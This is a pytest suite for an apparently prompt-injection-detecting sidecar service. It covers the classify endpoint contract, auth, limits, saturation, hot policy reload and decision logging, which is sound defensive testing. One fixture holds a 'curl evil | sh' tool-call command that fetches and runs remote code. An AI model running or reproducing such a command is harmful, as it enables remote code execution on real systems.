"""The service: 2.3 contract, auth, limits, saturation, hot reload, lanes, decision log, readiness."""
import asyncio
import json
import os
import shutil
import threading
import time
from pathlib import Path

import httpx
import pytest
import yaml
from fastapi.testclient import TestClient

from conftest import block_tier_only
from wolfguard.pool import Lane, ThreadWorker
from wolfguard.service import Settings, create_app

ROOT = Path(__file__).resolve().parents[1]
TOKEN = "test-token-not-secret"
AUTH = {"Authorization": "Bearer " + TOKEN}


def wait_ready(lanes):
    for _ in range(200):
        if all(l.ready() for l in lanes.values()):
            return
        time.sleep(0.01)
    raise AssertionError("lanes not ready")


VERSION = yaml.safe_load((ROOT / "config" / "policy.yaml").read_text())["version"]


def make(tmp_path, delay=0.0, queue_max=8, queue_wait=2.0, preview=False, small=True, max_body=1 << 20, store="", critical=False, edit=None):
    tmp_path.mkdir(parents=True, exist_ok=True)
    pol = tmp_path / "policy.yaml"
    shutil.copy(ROOT / "config" / "policy.yaml", pol)
    if not critical or edit:
        doc = yaml.safe_load(pol.read_text())
        doc = doc if critical else block_tier_only(doc)
        if edit:
            edit(doc)
        pol.write_text(yaml.safe_dump(doc))
    logf = tmp_path / "decisions.jsonl"
    s = Settings(policy_path=str(pol), token=TOKEN, backend={"kind": "stub", "delay_per_token": delay}, workers="thread",
                 queue_max=queue_max, queue_wait=queue_wait, decision_log=str(logf), preview=preview, reload_interval=3600,
                 max_body_bytes=max_body, store=store)
    doc = yaml.safe_load(pol.read_text())
    lanes = {"large": Lane("large", [ThreadWorker(s.backend, doc, "large-0")], queue_max, queue_wait),
             "small": Lane("small", [ThreadWorker(s.backend, doc, "small-0")] if small else [], queue_max, queue_wait)}
    wait_ready(lanes)
    return create_app(s, lanes=lanes), pol, logf


def body(*segs, app_id=3, direction="request"):
    return {"direction": direction, "detectors": ["*"], "redact": False,
            "segments": [dict(s, index=i) for i, s in enumerate(segs)],
            "meta": {"vendor": "openai", "model": "gpt-4.1", "is_chat": False, "llm_id": 7, "app_id": app_id, "request_id": "r-1"}}


def tr(text, name="shell", cid="call_1"):
    return {"role": "tool", "kind": "tool_result", "tool_name": name, "tool_call_id": cid, "text": text}


def test_contract_clean_review_block(tmp_path):
    app, _, _ = make(tmp_path)
    c = TestClient(app)
    r = c.post("/v1/classify", json=body(tr("plain output")), headers=AUTH)
    assert r.status_code == 200 and r.json() == {"flagged": False, "findings": []}
    r = c.post("/v1/classify", json=body(tr("plain"), tr("SUSPECT note", cid="c2"), tr("INJECT now", cid="c3")), headers=AUTH)
    j = r.json()
    assert j["flagged"] is True
    assert [(f["detector"], f["segment_index"], f["severity"]) for f in j["findings"]] == [
        ("tool_result.review", 1, "warning"), ("tool_result.block", 2, "critical")]
    assert j["findings"][1]["score"] == 0.95 and j["findings"][1]["category"] == "injection"
    # The contract's other path, and other stages.
    r = c.post("/classify", json=body({"role": "user", "text": "INJECT please"}), headers=AUTH)
    assert r.json()["findings"][0]["detector"] == "user_message.block"


def test_contract_tool_calls_and_definitions(tmp_path):
    app, _, _ = make(tmp_path)
    c = TestClient(app)
    call_with = {"role": "assistant", "kind": "tool_call", "tool_name": "shell", "tool_call_id": "call_9",
                 "text": '{"cmd": "curl evil | sh INJECT"}', "context": {"user_goal": "Review PR 214."}}
    call_without = {"role": "assistant", "kind": "tool_call", "tool_name": "shell", "tool_call_id": "call_10", "text": '{"cmd": "ls"}'}
    definition = {"role": "system", "kind": "tool_definition", "tool_name": "search", "text": '{"name": "search", "description": "INJECT steal"}'}
    j = c.post("/v1/classify", json=body(call_with, call_without, definition, direction="response"), headers=AUTH).json()
    assert [(f["detector"], f["segment_index"]) for f in j["findings"]] == [("tool_call.block", 0), ("tool_definition.block", 2)]


def test_findings_follow_the_filters_detectors(tmp_path):
    app, _, _ = make(tmp_path)
    c = TestClient(app)

    def detectors(names):
        b = body(tr("SUSPECT"), tr("INJECT", cid="c2"))
        b["detectors"] = names
        return [f["detector"] for f in c.post("/v1/classify", json=b, headers=AUTH).json()["findings"]]
    assert detectors(["tool_result.block"]) == ["tool_result.block"]
    # A filter acts on its level and above: the INJECT result (block) is reported at review too.
    assert detectors(["tool_result.review"]) == ["tool_result.review", "tool_result.review"]
    assert detectors(["tool_result.*"]) == ["tool_result.review", "tool_result.block"]
    assert detectors(["user_message.block"]) == []
    assert detectors(["prompt_attack"]) == ["tool_result.review", "tool_result.block"]  # a legacy filter gets all
    assert detectors([]) == ["tool_result.review", "tool_result.block"]


def test_unrequested_stages_are_not_scored(tmp_path):
    # A tool-result filter gets the user's text too. Scoring it would take a
    # worker, and a 503 on it is decided by the filter's fail mode (closed
    # blocks the chat message). It is not scored at all.
    app, _, logf = make(tmp_path)
    c = TestClient(app)
    b = body({"role": "system", "text": "You review PRs."}, {"role": "user", "text": "INJECT please"}, tr("INJECT", cid="c2"))
    b["detectors"] = ["tool_result.block"]
    j = c.post("/v1/classify", json=b, headers=AUTH).json()
    assert [(f["detector"], f["segment_index"]) for f in j["findings"]] == [("tool_result.block", 2)]
    assert [json.loads(line)["stage"] for line in logf.read_text().splitlines()] == ["tool_result"]
    # Only unrequested text: answered at once, nothing scored.
    b = body({"role": "user", "text": "INJECT please"})
    b["detectors"] = ["tool_result.block"]
    assert c.post("/v1/classify", json=b, headers=AUTH).json() == {"flagged": False, "findings": []}
    assert len(logf.read_text().splitlines()) == 1
    assert 'wolfguard_skipped_total{reason="not_requested"} 2.0' in c.get("/metrics", headers=AUTH).text
    # A user-message filter still gets the system context with the user's text.
    b = body({"role": "system", "text": "ctx"}, {"role": "user", "text": "INJECT please"}, tr("INJECT", cid="c2"))
    b["detectors"] = ["user_message.*"]
    assert [f["segment_index"] for f in c.post("/v1/classify", json=b, headers=AUTH).json()["findings"]] == [1]


def test_skipped_apps_never_wait_for_a_worker(tmp_path):
    # Every app on the LLM reaches the sidecar. A skipped app (and a stage an
    # app turns off) is answered before the lanes, so it is never refused
    # with a 503 behind another app's long tool result.
    pol = tmp_path / "policy.yaml"
    doc = block_tier_only(yaml.safe_load((ROOT / "config" / "policy.yaml").read_text()))
    doc["apps"] = {"77": {"skip": True}, "5": {"stages": ["tool_result"]}}
    pol.write_text(yaml.safe_dump(doc))
    logf = tmp_path / "decisions.jsonl"
    s = Settings(policy_path=str(pol), token=TOKEN, workers="thread", decision_log=str(logf), reload_interval=3600)
    # No workers at all: anything that reaches a lane is refused.
    app = create_app(s, lanes={"large": Lane("large", [], 0, 0.01), "small": Lane("small", [], 0, 0.01)})
    c = TestClient(app)
    assert c.post("/v1/classify", json=body(tr("INJECT"), {"role": "user", "text": "INJECT"}, app_id=77), headers=AUTH).json() == {"flagged": False, "findings": []}
    assert c.post("/v1/classify", json=body({"role": "user", "text": "INJECT"}, app_id=5), headers=AUTH).json() == {"flagged": False, "findings": []}
    assert c.post("/v1/classify", json=body(tr("INJECT"), app_id=5), headers=AUTH).status_code == 503
    assert not logf.exists() or not logf.read_text().strip()
    m = c.get("/metrics", headers=AUTH).text
    assert 'wolfguard_skipped_total{reason="app_skip"} 2.0' in m and 'wolfguard_skipped_total{reason="stage_off"} 1.0' in m


def test_rule_only_block_names_the_rule(tmp_path):
    app, pol, _ = make(tmp_path)
    doc = yaml.safe_load(pol.read_text())
    doc["canaries"] = ["CANARY-7f3a"]
    doc["version"] = "canary"
    pol.write_text(yaml.safe_dump(doc))
    app.state.store.reload()
    r = TestClient(app).post("/v1/classify", json=body({"role": "assistant", "kind": "tool_call", "tool_name": "send", "text": '{"b": "CANARY-7f3a"}',
                                                        "context": {"user_goal": "summarise"}}), headers=AUTH)
    f = r.json()["findings"][0]
    assert (f["detector"], f["label"], f["score"]) == ("tool_call.critical", "canary.leak", 1.0)


def test_auth(tmp_path):
    app, _, _ = make(tmp_path)
    c = TestClient(app)
    assert c.post("/v1/classify", json=body(tr("x"))).status_code == 401
    assert c.post("/v1/classify", json=body(tr("x")), headers={"Authorization": "Bearer wrong"}).status_code == 401
    assert c.get("/metrics").status_code == 401
    assert c.get("/metrics", headers=AUTH).status_code == 200
    assert c.get("/healthz").status_code == 200


def test_no_token_no_start(tmp_path):
    shutil.copy(ROOT / "config" / "policy.yaml", tmp_path / "p.yaml")
    with pytest.raises(SystemExit):
        create_app(Settings(policy_path=str(tmp_path / "p.yaml"), token=""), lanes={})


def test_limits_413(tmp_path):
    app, _, _ = make(tmp_path, max_body=50_000)
    c = TestClient(app)
    assert c.post("/v1/classify", json=body(tr("x" * 60_000)), headers=AUTH).status_code == 413
    app2, _, _ = make(tmp_path / "b")
    c2 = TestClient(app2)
    many = yaml.safe_load((ROOT / "config" / "policy.yaml").read_text())["limits"]["max_segments"] + 1
    assert c2.post("/v1/classify", json=body(*[tr("x")] * many), headers=AUTH).status_code == 413
    assert c2.post("/v1/classify", json=body(tr("y" * 40_001)), headers=AUTH).status_code == 413
    assert c2.post("/v1/classify", content=b"not json", headers=AUTH).status_code == 400


def test_saturation_503_within_the_queue_wait(tmp_path):
    app, _, _ = make(tmp_path, delay=0.02, queue_max=0, queue_wait=0.2, small=False)

    async def run():
        async with httpx.AsyncClient(transport=httpx.ASGITransport(app=app), base_url="http://t") as c:
            slow = asyncio.create_task(c.post("/v1/classify", json=body(tr(" ".join(["w"] * 100))), headers=AUTH))
            await asyncio.sleep(0.05)
            t = time.perf_counter()
            r = await c.post("/v1/classify", json=body(tr("quick")), headers=AUTH)
            took = time.perf_counter() - t
            await slow
            return r, took
    r, took = asyncio.run(run())
    assert r.status_code == 503 and took < 0.5


def test_a_call_whose_caller_left_is_not_scored(tmp_path):
    # The gateway gives up on a call at its timeout; if that call is still
    # queued, scoring it would only delay the calls behind it.
    from wolfguard.pool import Abandoned
    doc = block_tier_only(yaml.safe_load((ROOT / "config" / "policy.yaml").read_text()))
    lane = Lane("large", [ThreadWorker({"kind": "stub"}, doc, "large-0")], 8, 2.0)
    wait_ready({"large": lane})
    calls = []

    async def left():
        return True

    async def here():
        return False

    async def run():
        with pytest.raises(Abandoned):
            await lane.run(body(tr("INJECT")), doc, gone=left)
        calls.append("abandoned")
        (results, _), _ = await lane.run(body(tr("INJECT")), doc, gone=here)     # the worker went back to the queue
        return results
    results = asyncio.run(run())
    assert calls == ["abandoned"] and results[0].decision == "block"
    lane.close()


def test_unix_socket_listener_mode_and_group():
    # The gateway images run as uid/gid 65532 and reach the socket through
    # its group: 0660, that group, whatever the umask; a stale file or a
    # symlink at the path (planted, or left by a crash) is replaced, not followed.
    import socket
    import stat
    import tempfile
    from wolfguard.service import unix_socket
    d = Path(tempfile.mkdtemp(dir="/tmp"))           # AF_UNIX paths are short on macOS
    try:
        path = d / "wg.sock"
        target = d / "elsewhere"
        target.write_text("x")
        path.symlink_to(target)
        old = os.umask(0o000)
        try:
            s = unix_socket(str(path), gid=os.getgid())
        finally:
            os.umask(old)
        st = path.lstat()
        assert stat.S_ISSOCK(st.st_mode) and stat.S_IMODE(st.st_mode) == 0o660 and st.st_gid == os.getgid()
        assert target.read_text() == "x"
        c = socket.socket(socket.AF_UNIX)
        c.connect(str(path))
        c.close()
        s.close()
    finally:
        shutil.rmtree(d)


def test_process_workers_start_one_at_a_time():
    # Each worker loads the model behind a shared gate (two loads at once
    # pushed a 3 GB sidecar over its limit). Both still come up, and closing
    # one that never got through the gate is safe.
    from wolfguard.pool import ProcessWorker
    doc = block_tier_only(yaml.safe_load((ROOT / "config" / "policy.yaml").read_text()))
    with ProcessWorker._start_gate:
        w = ProcessWorker({"kind": "stub"}, doc, "gated")
        time.sleep(0.2)
        assert w.proc.pid is None and not w.ready.is_set()
    w.close()
    ws = [ProcessWorker({"kind": "stub"}, doc, f"w{i}") for i in range(2)]
    try:
        for x in ws:
            assert x.ready.wait(60), x.failed
        assert ws[1].call(body(tr("INJECT")), doc)[0][0].decision == "block"
    finally:
        for x in ws:
            x.close()


def test_short_message_not_starved_by_a_long_tool_result(tmp_path):
    app, _, _ = make(tmp_path, delay=0.0002)

    async def run():
        async with httpx.AsyncClient(transport=httpx.ASGITransport(app=app), base_url="http://t", timeout=60) as c:
            words = " ".join(f"w{i}" for i in range(6000))
            big = asyncio.create_task(c.post("/v1/classify", json=body(tr(words)), headers=AUTH))
            await asyncio.sleep(0.1)
            t = time.perf_counter()
            r = await c.post("/v1/classify", json=body({"role": "user", "text": "hello there"}), headers=AUTH)
            small_took = time.perf_counter() - t
            done_first = not big.done()
            await big
            return r, small_took, done_first
    r, took, done_first = asyncio.run(run())
    assert r.status_code == 200 and done_first and took < 0.3, took


def test_hot_reload_and_invalid_policy_kept(tmp_path):
    app, pol, _ = make(tmp_path)
    c = TestClient(app)
    assert c.post("/v1/classify", json=body(tr("SUSPECT")), headers=AUTH).json()["findings"][0]["detector"] == "tool_result.review"
    doc = yaml.safe_load(pol.read_text())
    for q in doc["stages"]["tool_result"]["questions"].values():
        q["review"] = 0.6
    doc["version"] = "raised-review"
    pol.write_text(yaml.safe_dump(doc))
    os.utime(pol, None)
    assert app.state.store.reload() is True
    assert c.post("/v1/classify", json=body(tr("SUSPECT")), headers=AUTH).json() == {"flagged": False, "findings": []}
    pol.write_text("stages: {tool_result: {questions: {instruction.handling: {type: noul, instructions: x}}}}\nversion: bad\n")
    os.utime(pol, ns=(time.time_ns(), time.time_ns() + 10))
    assert app.state.store.reload() is False and app.state.store.version == "raised-review"
    assert "wolfguard_policy_invalid 1.0" in c.get("/metrics", headers=AUTH).text


def test_policy_version_mismatch_is_counted(tmp_path, caplog):
    app, _, _ = make(tmp_path)
    c = TestClient(app)
    c.post(f"/v1/classify?policy={VERSION}", json=body(tr("x")), headers=AUTH)
    c.post("/v1/classify?policy=old-one", json=body(tr("x")), headers=AUTH)
    assert "wolfguard_policy_version_mismatch_total 1.0" in c.get("/metrics", headers=AUTH).text
    assert any("old-one" in r.message for r in caplog.records)


def test_decision_log_has_no_text_without_previews(tmp_path):
    app, _, logf = make(tmp_path)
    c = TestClient(app)
    c.post("/v1/classify", json=body(tr("INJECT CANARY-SECRET-123 and more")), headers=AUTH)
    raw = logf.read_text()
    assert "CANARY-SECRET-123" not in raw
    rec = json.loads(raw.splitlines()[-1])
    assert rec["decision"] == "block" and rec["stage"] == "tool_result" and rec["request_id"] == "r-1" and len(rec["sha256"]) == 64
    assert rec["policy_version"] == VERSION and "preview" not in rec
    app2, _, logf2 = make(tmp_path / "p", preview=True)
    TestClient(app2).post("/v1/classify", json=body(tr("INJECT CANARY-SECRET-123")), headers=AUTH)
    assert "CANARY-SECRET-123" in logf2.read_text()


def test_previews_in_their_own_log_for_their_own_retention(tmp_path):
    app, _, logf = make(tmp_path, preview=True)
    app.state.dlog.preview_log = open(tmp_path / "previews.jsonl", "a", buffering=1)
    TestClient(app).post("/v1/classify", json=body(tr("plain"), tr("INJECT CANARY-SECRET-456", cid="c2")), headers=AUTH)
    assert "CANARY-SECRET-456" not in logf.read_text()
    prev = [json.loads(l) for l in (tmp_path / "previews.jsonl").read_text().splitlines()]
    assert len(prev) == 1 and "CANARY-SECRET-456" in prev[0]["preview"] and len(prev[0]["sha256"]) == 64
    decision = [json.loads(l) for l in logf.read_text().splitlines() if '"block"' in l][0]
    assert decision["sha256"] == prev[0]["sha256"]  # joined by hash


def test_readyz_false_until_warm_up(tmp_path):
    shutil.copy(ROOT / "config" / "policy.yaml", tmp_path / "p.yaml")

    class Slow:
        def __init__(self):
            self.ready, self.failed, self.workers = threading.Event(), None, [1]

        def call(self, *a):
            raise AssertionError

        def close(self):
            pass
    w = Slow()
    lane = Lane("large", [w])
    app = create_app(Settings(policy_path=str(tmp_path / "p.yaml"), token=TOKEN, decision_log=str(tmp_path / "d")), lanes={"large": lane})
    c = TestClient(app)
    assert c.get("/readyz").status_code == 503
    w.ready.set()
    assert c.get("/readyz").status_code == 200 and c.get("/readyz").json()["policy_version"] == VERSION
